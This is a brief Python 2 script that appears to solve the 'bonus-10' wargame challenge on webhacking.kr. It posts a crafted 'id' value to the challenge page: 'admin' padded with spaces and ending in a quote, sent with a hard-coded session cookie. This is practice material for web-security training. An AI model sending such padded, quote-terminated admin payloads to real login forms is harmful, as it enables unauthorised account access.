#-*- coding: utf-8 -*-
import urllib
import urllib2
import CookieManager

challengeUrl = "http://webhacking.kr/challenge/bonus/bonus-10/index.php"
parameter = urllib.urlencode({
    "id": "admin         '"
})
CookieManager.addCookie("PHPSESSID", "a90f69bdc1cdceaf479ca1ebcd368d29")
httpRequest = urllib2.Request(challengeUrl, parameter)
httpRequest.add_header("Cookie", CookieManager.getCookie())
httpRequest.get_method = lambda: "POST"
httpConnection = None
try:
    httpConnection = urllib2.urlopen(httpRequest)
    httpResponse = httpConnection.read()
    print httpResponse
except:
    raise
finally:
    if httpConnection != None:
        httpConnection.close()
